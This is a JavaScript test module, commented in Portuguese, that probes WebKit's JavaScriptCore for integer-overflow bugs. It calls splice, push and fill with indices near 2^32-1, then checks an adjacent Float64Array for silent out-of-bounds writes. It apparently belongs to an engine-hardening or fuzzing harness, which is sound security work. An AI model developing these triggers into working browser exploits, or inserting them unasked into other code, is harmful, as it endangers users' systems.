/**
 * SC_ARRAY_INT_OVERFLOW.JS
 * Categoria : MEMORY — Integer Overflow
 * Alvo      : JSC ArrayPrototype / Butterfly realloc
 * Técnica   : Overflow de inteiro 32-bit em splice() e push() com
 *             índices próximos de 2^32-1, forçando underflow no
 *             cálculo do novo tamanho do Butterfly, podendo sobrescrever
 *             metadados adjacentes no heap.
 * Referência: Similar ao CVE-2019-8506 (WebKit array length confusion)
 */

export default {
    id:          'ARRAY_INT_OVERFLOW',
    category:    'MEMORY',
    risk:        'HIGH',
    description: 'Integer overflow em splice/push com índice ~2^32-1. '
                + 'Testa se o JSC recalcula o Butterfly sem truncar para 32 bits.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _arr:        null,
    _sparse:     null,
    _victim:     null,

    supported: function() { return true; },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        // Array denso normal
        this._arr    = [1.1, 2.2, 3.3, 4.4, 5.5];

        // Array esparso com índice muito alto
        this._sparse = [];
        this._sparse[0xFFFFFFFE] = 0xDEAD;   // força length = 0xFFFFFFFF

        // Array vítima adjacente no heap — detectamos corrupção se ele mudar
        this._victim = new Float64Array(8);
        this._victim.fill(1.1111111111111);
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        try {
            // 1) splice no limite superior — pode truncar para negativo internamente
            this._arr.splice(0xFFFFFFFF - 2, 1, 9.9, 8.8, 7.7);
        } catch(_) {}

        try {
            // 2) push empurrando além de 2^32 — length wraps to 0?
            const big = new Array(0xFFFFFFFF);
            big.push(1.1, 2.2);
        } catch(_) {}

        try {
            // 3) fill com offset inteiro-overflow
            const f64 = new Float64Array(new ArrayBuffer(64));
            f64.fill(3.14, 0xFFFFFFFF, 0xFFFFFFFF + 4);
        } catch(_) {}

        await new Promise(r => setTimeout(r, 0));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-4] integridade do array normal
        s => s._arr.length,
        s => s._arr[0],
        s => s._arr[4],
        s => Array.isArray(s._arr),
        s => Object.isFrozen(s._arr),

        // [5-7] integridade do esparso
        s => s._sparse.length,
        s => s._sparse[0xFFFFFFFE],
        s => typeof s._sparse[0xFFFFFFFE],

        // [8-11] vítima Float64 — detecta OOB write silencioso
        s => s._victim[0],
        s => s._victim[3],
        s => s._victim[7],
        s => s._victim.byteLength,

        // [12-14] invariantes do motor
        s => [].concat(s._arr).length,
        s => s._arr.indexOf(1.1),
        s => JSON.stringify(s._arr.slice(0, 5)),
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._arr    = null;
        this._sparse = null;
        this._victim = null;
    }
};
